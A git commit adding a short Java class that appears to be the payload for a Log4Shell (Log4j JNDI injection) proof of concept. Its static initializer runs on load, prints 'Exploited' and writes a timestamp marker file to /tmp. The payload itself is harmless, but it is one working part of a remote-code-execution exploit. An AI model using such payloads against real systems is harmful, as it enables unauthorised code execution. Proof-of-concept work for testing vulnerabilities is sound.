83b16346e5b948877a00a1e553aac55a4f446502
ankur-katiyar <ankur.katiyar@gmail.com>
2021-12-16 18:51:11 -0500

    updat

---
+++ Log4jpoc.java
@@ -0,0 +1,34 @@
+import java.io.BufferedWriter;
+import java.io.File;  // Import the File class
+import java.io.FileWriter;
+import java.io.IOException;  // Import the IOException class to handle errors
+import java.sql.Timestamp;
+
+
+public class Log4jpoc {
+    public Log4jpoc() {}
+    static {
+        try {
+            System.out.println("Exploited");
+            File myObj = new File("/tmp/testfile.txt");
+            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+            if (myObj.createNewFile()) {
+              System.out.println("File created: " + myObj.getName());
+              
+            } else {
+              System.out.println("File already exists, writing timestamp to it");
+              BufferedWriter out = new BufferedWriter(
+                      new FileWriter("/tmp/testfile.txt", true));
+              
+              out.write(timestamp+"\n");
+              out.newLine();
+              out.close();
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] args) {
+        Log4jpoc e = new Log4jpoc();
+    }
+}
